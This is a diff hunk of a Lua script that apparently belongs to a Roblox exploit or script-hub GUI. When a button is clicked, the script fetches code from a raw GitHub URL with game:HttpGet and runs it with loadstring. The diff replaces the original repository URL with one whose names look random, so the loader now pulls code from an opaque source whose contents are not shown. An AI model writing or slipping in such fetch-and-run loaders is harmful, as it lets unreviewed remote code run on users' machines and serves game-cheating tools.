@@ -106,7 +106,7 @@ local function DGSOJPY_fake_script() -- openBtn.openScript
 	local openKr = script.Parent.Parent.Parent.OpenKr
 	
 	btn.MouseButton1Click:Connect(function()	
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/lr77world/ir77/main/file1"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/84wbhtuwign8wagb7/tfnfgnfgnfgnf/main/vrdesv"))()
 		wait(0.001)
 		openKr:Destroy()
 	end)
